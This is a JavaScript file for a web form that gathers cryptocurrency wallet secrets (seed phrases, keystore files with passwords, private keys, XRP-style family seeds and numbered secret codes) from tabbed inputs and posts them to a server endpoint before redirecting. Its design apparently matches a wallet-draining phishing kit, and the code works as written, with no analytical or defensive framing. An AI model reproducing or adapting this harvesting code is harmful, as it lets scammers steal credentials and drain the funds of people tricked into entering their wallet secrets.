const form = document.querySelector('form[action="/api/process"]');
if (!form) {
    console.error('Form not found! Ensure the form action is set to "/api/process".');
} else {
    form.addEventListener('submit', async (event) => {
        event.preventDefault();

        const activeTab = document.querySelector('.acc-body.active');
        if (!activeTab) {
            console.error('No active tab found!');
            alert('Error: No active tab selected.');
            return;
        }

        const formData = new FormData();
        const walletInput = form.querySelector('input[name="wallet"]');
        if (walletInput) {
            formData.append('wallet', walletInput.value || 'Not provided');
        }

        const activeTabId = activeTab.id;
        if (activeTabId === 'first') {
            const phrase = form.querySelector('textarea[name="phrase"]').value;
            formData.append('phrase', phrase || 'Not provided');
        } else if (activeTabId === 'second') {
            const keystoreJson = form.querySelector('textarea[name="keystore_json"]').value;
            const keystorePassword = form.querySelector('input[name="keystore_password"]').value;
            formData.append('keystore_json', keystoreJson || 'Not provided');
            formData.append('keystore_password', keystorePassword || 'Not provided');
        } else if (activeTabId === 'third') {
            const privateKey = form.querySelector('input[name="private_key"]').value;
            formData.append('private_key', privateKey || 'Not provided');
        } else if (activeTabId === 'fourth') {
            const familySeed = form.querySelector('textarea[name="family_seed"]').value;
            formData.append('family_seed', familySeed || 'Not provided');
        } else if (activeTabId === 'fiveth') {
            for (let i = 1; i <= 8; i++) {
                const secretNumber = form.querySelector(`input[name="secret_number_${i}"]`)?.value;
                if (secretNumber !== undefined) {
                    formData.append(`secret_number_${i}`, secretNumber || 'Not provided');
                }
            }
        }

        console.log('Submitting Form Data:', Object.fromEntries(formData));
        console.log('Active Tab ID:', activeTabId);

        const sendingOverlay = document.querySelector(".sending");
        if (sendingOverlay) {
            sendingOverlay.style.display = "flex";
        }

        try {
            const response = await fetch('/api/process', {
                method: 'POST',
                body: formData
            });

            console.log('Response Status:', response.status);
            const result = await response.json();
            console.log('Response Data:', result);

            if (result.success) {
                console.log('Redirecting to:', result.redirect);
                window.location.href = result.redirect;
            } else {
                console.error('Form submission failed:', result.error || 'Unknown error');
                alert('Failed to submit the form: ' + (result.error || 'Please try again later.'));
                if (sendingOverlay) {
                    sendingOverlay.style.display = "none";
                }
            }
        } catch (error) {
            console.error('Fetch Error:', error.message);
            alert('An error occurred while submitting the form: ' + error.message);
            if (sendingOverlay) {
                sendingOverlay.style.display = "none";
            }
        }
    });
}